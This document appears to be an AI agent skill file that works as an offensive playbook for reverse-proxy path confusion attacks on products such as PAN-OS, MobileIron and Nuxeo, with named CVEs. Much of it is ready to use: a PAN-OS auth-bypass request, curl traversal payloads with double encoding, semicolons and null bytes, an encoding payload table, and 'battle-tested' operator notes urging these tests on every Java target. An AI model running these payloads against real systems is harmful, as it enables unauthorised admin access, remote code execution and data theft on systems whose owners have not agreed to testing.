---
name: server-confusion-attacks
description: "Exploit path-handling disagreements between reverse proxy and backend — Nginx/Apache double decoding, semicolon path parameters, and traversal normalization gaps that reach admin routes the proxy believed it was blocking. Use when the stack is a proxy fronting Tomcat/Java (PAN-OS, MobileIron/Ivanti, Nuxeo) and direct requests to protected paths return 403."
---

# Reverse Proxy Path Confusion Attacks

## Crown Jewel Targets

- PAN-OS management interface (Nginx + Apache double decode = admin bypass)
- MobileIron/Ivanti MDM (Apache + Tomcat semicolon = pre-auth RCE chain)
- Amazon Nuxeo (proxy + Tomcat traversal to admin)
- Spring Boot behind Nginx/HAProxy (actuator bypass)
- Microsoft Exchange CAS proxy (header trust exploitation)
- Any multi-layer architecture: CDN/LB + Proxy + Backend

## Attack Surface Signals

- Different `Server` headers at different paths (multiple layers)
- Proxy indicators: `Via`, `X-Forwarded-For`, `X-Real-IP` headers
- Java backend: JSESSIONID, `.jsp`/`.do` URLs behind Nginx/Apache
- Error page style differences between proxy and backend
- `X-pan-AuthCheck`, `X-Auth-Check`, or similar proxy-set auth headers

**Sources:** Orange Tsai, SLCyber (Assetnote), WatchTowr Labs
**Key CVEs:** CVE-2025-0108 (PAN-OS), CVE-2020-15505 (MobileIron), CVE-2024-38475 (Apache)

## Core Concept

When a request passes through multiple layers (Nginx → Apache → Backend, or Proxy → Tomcat), each layer parses the URL path differently. Security decisions made at one layer can be invalidated by how another layer resolves the same path.

## Pattern 1: Nginx/Apache Double Decode (PAN-OS CVE-2025-0108)

Architecture: Nginx (auth) → Apache (rewrite) → PHP

**How it works:**
1. Nginx decodes URL once: `/unauth/%2e%2e/php/admin.php` — no `..` visible
2. Nginx matches `/unauth/.*` → sets `X-pan-AuthCheck: off`
3. Apache RewriteRule matches → triggers internal redirect → decodes AGAIN
4. Apache now sees `/unauth/../php/admin.php` → normalizes to `/php/admin.php`
5. PHP executes with auth disabled

**Exploit:**
```http
GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1
```

The `/PAN_help/x.css` suffix is needed to trigger the Apache RewriteRule that causes the internal redirect (and second decode).

**Key insight:** Per-directory RewriteRules cause Apache to re-process URLs, introducing a second decode pass.

## Pattern 2: Java Semicolon Path Parameter (Tomcat/JBoss)

Java servlet containers treat `;` as a path parameter delimiter and strip everything between `;` and the next `/`.

**Proxy sees:** `/login.jsp;/..;/admin` → path is `/login.jsp;/..;/admin`
**Tomcat resolves:** strips `;...` → `/login.jsp/../admin` → `/admin`

### Amazon Nuxeo RCE Chain

```bash
# Proxy allows /login.jsp (whitelisted)
# Tomcat resolves traversal to /admin area
curl https://target/nuxeo/login.jsp;/..;/unauthorized_area
```

### MobileIron MDM RCE (CVE-2020-15505)

```bash
# Apache blocks /mifs/services/ directly
# But .;/ confuses Apache, Tomcat normalizes it
curl https://mobileiron/mifs/.;/services/someService
```

## Pattern 3: Encoded Path Traversal Variants

Different proxy/backend combinations handle encoded characters differently:

| Payload | Proxy Sees | Backend Resolves |
|---------|-----------|-----------------|
| `%2e%2e` | Literal `%2e%2e` | `..` (after decode) |
| `%252e%252e` | `%2e%2e` (single decode) | `..` (double decode) |
| `..;/` | `..;/` (path param) | `../` (Java strips `;`) |
| `.;/..;/` | `.;/..;/` | `/../` (Java) |
| `/..%00/` | Null byte truncation | Path traversal |
| `%c0%ae%c0%ae` | Overlong UTF-8 | `..` (some parsers) |

## Pattern 4: Header Injection via Proxy Inconsistency

When auth is enforced via headers at the proxy layer:

```nginx
# Nginx sets auth header
proxy_set_header X-Auth-Check 'on';

# But disables for certain paths
if ($uri ~ ^/public/) {
    set $authCheck 'off';
}
```

Bypass: confuse the proxy about the path to reach auth-required endpoints with auth disabled.

## Pattern 5: Protocol Smuggling via Path

```
# Reach mod_proxy via RewriteRule prefix control
/brokenproxy:unix:/run/php/fpm.sock|http://path/

# Reach internal services via SSRF in proxy layer
/api/proxy?url=http://127.0.0.1:8080/admin
```

## Testing Methodology

### Step 1: Identify Architecture Layers
- Check response headers for proxy signatures (Server, X-Powered-By, Via)
- Look for different error page styles at different paths
- Check for Java backend indicators (JSESSIONID, .jsp/.do URLs)

### Step 2: Test Path Confusion Payloads

```bash
# Double encoding
curl -k https://target/public/%252e%252e/admin

# Java semicolon
curl -k https://target/public/..;/admin
curl -k https://target/public/.;/..;/admin

# Encoded dot-dot
curl -k https://target/public/%2e%2e/admin

# Null byte (older systems)
curl -k https://target/public/..%00/admin

# Backslash (Windows/IIS)
curl -k https://target/public/..%5c/admin

# Mixed
curl -k https://target/public/%2e%2e%3b/admin
```

### Step 3: Verify Auth Bypass

Compare responses:
```bash
# Normal request (should get 401/403)
curl -k https://target/admin

# Confusion payload (if 200 → auth bypass confirmed)
curl -k https://target/public/..;/admin
```

### Step 4: Identify Internal Headers

Look for proxy-set headers in error messages or documentation:
- `X-Forwarded-For`, `X-Real-IP`
- `X-Auth-Check`, `X-pan-AuthCheck`
- `X-CommonAccessToken` (Exchange)
- Custom headers visible in debug endpoints

## Real-World Vulnerable Architectures

| Product | Pattern | CVE |
|---------|---------|-----|
| PAN-OS | Nginx + Apache double decode | CVE-2025-0108 |
| MobileIron MDM | Apache + Tomcat semicolon | CVE-2020-15505 |
| Amazon Nuxeo | Proxy + Tomcat semicolon | Orange Tsai 2018 |
| Spring Boot | Proxy + Spring `;` handling | Multiple |
| MS Exchange | CAS proxy + backend header trust | ProxyLogon/ProxyShell |
| Apache mod_rewrite | DocumentRoot escape via %3F | CVE-2024-38475 |

## Bug Bounty Relevance

- **CRITICAL**: Auth bypass → access admin panels, internal APIs
- **CRITICAL**: Path traversal → read sensitive files, configs
- **HIGH**: SSRF via proxy confusion → access cloud metadata
- **HIGH**: Handler confusion → execute uploaded files

## Operator Notes (Battle-Tested)

- **Identify layers first**: Check response headers at different paths. Different error page styles = different backend layers. Map the architecture before payload crafting.
- **Double decode is PAN-OS gold**: `%252e%252e` passes Nginx (sees `%2e%2e`), Apache RewriteRule triggers second decode, resolves to `../`. Per-directory RewriteRules cause the re-processing.
- **Java semicolon is universal**: `/login.jsp;/..;/admin` — proxy sees `/login.jsp;/..;/admin`, Tomcat strips matrix params and resolves traversal. Test on EVERY Java + reverse proxy target.
- **Test all encoding variants**: `%2e%2e`, `%252e%252e`, `..;/`, `.;/..;/`, `..%00/`, `%c0%ae%c0%ae`. Different proxy/backend combos handle each differently.
- **Look for proxy-set auth headers**: If you find headers like `X-Auth-Check` or `X-pan-AuthCheck`, confusing the proxy about the path lets you reach auth-required endpoints with auth disabled.
- **Always compare auth vs no-auth**: Send the confusion payload and compare against a normal request. 200 vs 401/403 = confirmed bypass.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `references/tomcat-path-normalization-bypass.md` | Tomcat-specific semicolon traversal |
| `java-matrix-param-bypass` | Matrix param auth bypass |
| `references/apache-confusion-attacks.md` | Apache-specific confusion |
| `exchange-attacks` | Exchange CAS proxy exploitation |
| `appliance-management-attacks` | PAN-OS/FortiOS management bypass |

## Reference files

Read these when the situation calls for the depth they carry — they are not loaded automatically.

- `references/apache-confusion-attacks.md` — **apache confusion attacks** — related_patterns:
- `references/tomcat-path-normalization-bypass.md` — **tomcat path normalization bypass** — related_patterns:
